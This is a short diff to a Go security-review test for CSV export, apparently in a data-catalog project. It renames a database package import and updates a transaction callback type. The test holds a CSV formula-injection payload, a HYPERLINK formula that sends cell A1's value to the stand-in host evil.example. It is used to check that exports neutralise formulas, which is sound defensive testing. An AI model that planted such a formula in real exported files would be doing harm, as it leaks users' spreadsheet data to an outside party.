@@ -18,9 +18,9 @@ import (
 	"github.com/xuri/excelize/v2"
 
 	"abidata/internal/catalog"
+	"abidata/internal/dbx"
 	"abidata/internal/fault"
 	"abidata/internal/query"
-	"abidata/internal/sqlitex"
 	"abidata/internal/workspace"
 )
 
@@ -166,7 +166,7 @@ func TestSecReview_CSVExportCalculatedFormula(t *testing.T) {
 		catalog.ColumnSpec{DisplayName: "=1+1", Type: catalog.ShortText},
 	)
 	payload := `=HYPERLINK("http://evil.example/?"&A1,"x")`
-	if err := e.l.Write(e.ctx, workspace.Background, func(tx *sqlitex.Tx) error {
+	if err := e.l.Write(e.ctx, workspace.Background, func(tx dbx.Tx) error {
 		_, err := tx.Exec(e.ctx, `INSERT INTO `+catalog.Quote(tb.PhysicalName)+`(`+catalog.Quote(col2(t, tb, "Name").PhysicalName)+`) VALUES (?)`, payload)
 		return err
 	}); err != nil {
